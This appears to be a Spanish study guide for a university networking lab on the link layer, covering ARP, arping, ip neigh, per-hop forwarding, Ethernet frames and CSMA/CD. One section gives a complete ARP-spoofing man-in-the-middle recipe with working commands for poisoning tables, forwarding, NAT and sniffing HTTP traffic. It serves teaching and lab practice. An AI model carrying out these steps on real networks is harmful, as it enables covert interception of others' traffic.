---
tags:
  - protos
  - practica
  - enlace
  - arp
  - ethernet
  - guia
---

# Guía Práctica: Capa de Enlace (ARP, Ethernet)

---

## ARP — comandos esenciales

```sh
# Ver tabla ARP (IP ↔ MAC)
arp -n
arp -a

# Agregar entrada estática a la tabla ARP
arp -s <ip> <mac>                  # sin interfaz
arp -s <ip> <mac> -i <interfaz>    # con interfaz específica
arp -s <ip> <mac> temp             # temporal (BSD/macOS)

# Borrar una entrada
sudo arp -d <ip>
```

→ Ver [[guia_respuestas#E96|E96]]

---

## arping — enviar ARP requests manuales

```sh
sudo apt install arping

# Argumentos disponibles
arping [-t <target-mac>] [-T <target-ip>] [-s <source-mac>] [-S <source-ip>] <destino>

# Ejemplo: verificar que una IP está en uso
sudo arping -I <interfaz> <ip>
```

Los 4 argumentos que importan (son los que pide el lab):

| Flag | Qué pone en la trama ARP |
|---|---|
| `-S <ip>` | **source IP** — la IP que decimos tener (acá se miente) |
| `-s <mac>` | **source MAC** — la MAC que decimos tener |
| `-T <ip>` | **target IP** — a quién le preguntamos |
| `-t <mac>` | **target MAC** |

```sh
# Verificar si una IP esta en uso en la red
sudo arping -I <interfaz> <ip>

# ARP gratuito: anunciar "yo tengo esta IP" sin que nadie pregunte
# (-A manda ARP Reply, -U manda Request; ambos actualizan la tabla del que lo recibe)
sudo arping -U -I <interfaz> -S <mi_ip> <mi_ip>
```

> arping no modifica **tu** tabla ARP ni requiere tener la IP — por eso sirve para spoofing.

### `ip neigh` — el reemplazo moderno de `arp`

```sh
ip neigh                                   # ver tabla (= arp -n)
ip neigh add <ip> lladdr <mac> dev <if>    # entrada estatica (= arp -s)
ip neigh del <ip> dev <if>                 # borrar (= arp -d)
ip neigh flush all                         # limpiar toda la tabla
```

| Estado en `ip neigh` | Significa |
|---|---|
| `REACHABLE` | entrada fresca y confirmada |
| `STALE` | vieja, se revalida al próximo uso |
| `PERMANENT` | estatica (puesta a mano) |
| `FAILED` | no respondió nadie a ese ARP |

→ Ver [[Laboratorio#arping]]

---

## Cómo funciona ARP

1. Host A quiere enviar a B (misma red), no tiene su MAC.
2. A manda **ARP Request** en broadcast (`ff:ff:ff:ff:ff:ff`): "¿Quién tiene IP X?"
3. B responde con **ARP Reply** unicast: "Yo tengo IP X, mi MAC es YY:YY:YY:YY:YY:YY"
4. A guarda la entrada en su tabla ARP y envía la trama.

**Si el destino está en otra red**: A hace ARP al **Gateway** (router), no al host final.

---

## Forwarding IP — qué cambia y qué no en cada salto

| Campo | ¿Cambia en forwarding? |
|---|---|
| **Ethernet src MAC** | ✅ sí — pasa a ser la MAC del router |
| **Ethernet dst MAC** | ✅ sí — pasa a ser la MAC del próximo salto |
| **IP src** | ❌ no — sigue siendo el origen original |
| **IP dst** | ❌ no — sigue siendo el destino final |
| **IP TTL** | ✅ sí — se decrementa en 1 |

> Regla de oro: **Ethernet es local** (MACs cambian en cada salto). **IP es end-to-end** (IPs no cambian).

→ Ver [[guia_respuestas#E97|E97]]

---

## ARP Spoofing (MITM) — receta completa de lab

Objetivo: meterse en el medio del tráfico entre **H** (la víctima) y **R** (el router),
sin que ninguno se entere. Se logra envenenando **las dos** tablas ARP.

La idea: cuando H quiere hablar con R hace ARP "¿quién tiene la IP de R?". Si nosotros
contestamos (o le inyectamos) **nuestra MAC** para la IP de R, H nos manda a nosotros todo
lo que creía mandar a R.

### Paso 0 — datos que necesito

```sh
ip addr show <if>            # mi IP y mi MAC
ip neigh                     # las MACs de H y R si ya las aprendi
sudo arping -I <if> <ip_H>   # forzar a descubrir la MAC de H
sudo arping -I <if> <ip_R>   # idem R
```

### Paso 1 — habilitar forwarding ANTES de spoofear

Si no reenviamos, H y R pierden conexión y el ataque se nota (DoS en vez de MITM):

```sh
sudo sysctl -w net.ipv4.ip_forward=1
cat /proc/sys/net/ipv4/ip_forward      # tiene que decir 1
```

### Paso 2 — envenenar las DOS direcciones

```sh
# A H le decimos "la IP de R la tengo yo" (source IP = R, va con MI mac por la interfaz)
sudo arping -I <if> -S <ip_R> <ip_H>

# A R le decimos "la IP de H la tengo yo"
sudo arping -I <if> -S <ip_H> <ip_R>
```

> Hay que **repetirlo periódicamente** (loop cada pocos segundos): la entrada falsa expira
> y ademas el ARP real de R la puede re-pisar. `arpspoof` (de `dsniff`) hace el loop solo:
>
> ```sh
> sudo arpspoof -i <if> -t <ip_H> <ip_R>    # envenena a H haciendose pasar por R
> sudo arpspoof -i <if> -t <ip_R> <ip_H>    # y al reves (otra terminal)
> ```

### Paso 3 — (si hace falta salir a internet) NAT

Solo si queremos que el tráfico de H salga de verdad por R hacia afuera:

```sh
sudo iptables -t nat -A POSTROUTING -o <if> -j MASQUERADE
```

### Paso 4 — mirar el tráfico

```sh
sudo tcpdump -i <if> -n host <ip_H>              # ver lo que manda H
sudo tcpdump -i <if> -n -A port 80               # payload HTTP en claro
```

### Verificar que funcionó

En **H**, su tabla ARP tiene que mostrar la IP de R apuntando a **nuestra MAC**:

```sh
# en H:
arp -n        # la linea de <ip_R> debe tener NUESTRA mac, no la de R
```

> [!TIP] Cómo lo ves en Wireshark
> Capturando en H, la IP destino de los paquetes a internet sigue siendo la de R, pero la
> **MAC destino Ethernet es la nuestra**. Esa es la firma del ARP spoofing: IP correcta,
> MAC equivocada.

### Deshacer el ataque (limpieza)

```sh
sudo sysctl -w net.ipv4.ip_forward=0
# re-anunciar las MACs verdaderas para "curar" las tablas:
sudo arping -I <if> -S <ip_R> <ip_H>    # pero disparado desde R, o esperar a que expire
```

→ Ver [[guia_respuestas#E98|E98]], [[Laboratorio#Enlace]], [[Cheatsheet_lab_ip.pdf]]

---

## Forwarding — los casos del ping (qué ves en Wireshark)

Ejercicio clásico: *"H pinguea a X, ¿hay forwarding? ¿qué MACs/IPs ves?"*. Topología:
`H — R — R2 — H2`.

| H pinguea a… | ¿Forwarding? | Qué pasa |
|---|---|---|
| su propia IP | no | el paquete no sale de H (loopback interno) |
| la IP de R en la pata que da a H | no | R es el destino final, responde él |
| la IP de R en **otra** pata | no | sigue siendo R el destino; entra por una interfaz, sale por otra |
| R2 (el otro router) | **sí** | R reenvía: entra por una pata, sale por otra, cambian MACs |
| H2 (host detrás de R2) | **sí** (2 saltos) | R y R2 reenvían; en cada salto cambian las MACs |

### Qué cambia en cada salto (regla de oro)

```
Segmento H → R:              Segmento R → R2:
  Eth src: MAC de H            Eth src: MAC de R (pata que da a R2)   ← CAMBIO
  Eth dst: MAC de R            Eth dst: MAC de R2                     ← CAMBIO
  IP src:  IP de H            IP src:  IP de H                        ← igual
  IP dst:  IP de R2           IP dst:  IP de R2                       ← igual
  TTL:     n                   TTL:     n-1                           ← DECREMENTA
```

> **Ethernet es local** (las MACs cambian salto a salto). **IP es end-to-end** (src/dst IP
> no cambian nunca; solo el TTL baja 1 por router). Si en Wireshark ves que la IP destino
> no coincide con la MAC destino → estás viendo un paquete en tránsito hacia un router.

---

## Estructura de trama Ethernet

```
| Preámbulo (8B) | MAC destino (6B) | MAC origen (6B) | Tipo (2B) | Datos (46-1500B) | CRC (4B) |
```

- **MAC broadcast**: `ff:ff:ff:ff:ff:ff`
- **CRC**: verifica que la trama llegó sin errores
- **MTU**: máximo 1500 bytes de datos (sin headers Ethernet)

---

## CSMA/CD — detección de colisiones (Ethernet cableado)

Para que una colisión sea detectable, la trama debe tardar más en transmitirse de lo que tarda la señal en viajar de un extremo al otro y volver:

```
Condición: L/R > 2 × d_prop

L = tamaño de trama en bits
R = tasa de transmisión
d_prop = tiempo de propagación end-to-end
```

Por eso Ethernet impone:
- **Tamaño mínimo de trama: 64 bytes** (para que L/R sea suficientemente grande)
- **Longitud máxima de cable** (para que d_prop sea pequeño)

→ Ver [[notas/8_enlace#Pregunta 12|Pregunta Enlace 12]]

---

## Escenarios comunes con ARP

### Caso: entrada ARP estática apuntando a MAC equivocada

Si se agrega `arp -s <ip_buena> <mac_mala>`:
- Los paquetes a `<ip_buena>` se envían a la MAC equivocada
- El host real con `<ip_buena>` nunca los recibe
- Si hay forwarding habilitado en el host con `<mac_mala>`, podría redirigir los paquetes

### Caso: dos entradas ARP para la misma IP

Solo queda una: la tabla ARP asocia una IP con una única MAC. Si intentás agregar dos, la segunda pisa la primera.

→ Ver [[guia_respuestas#E96|E96]] puntos e, f, g, h, j
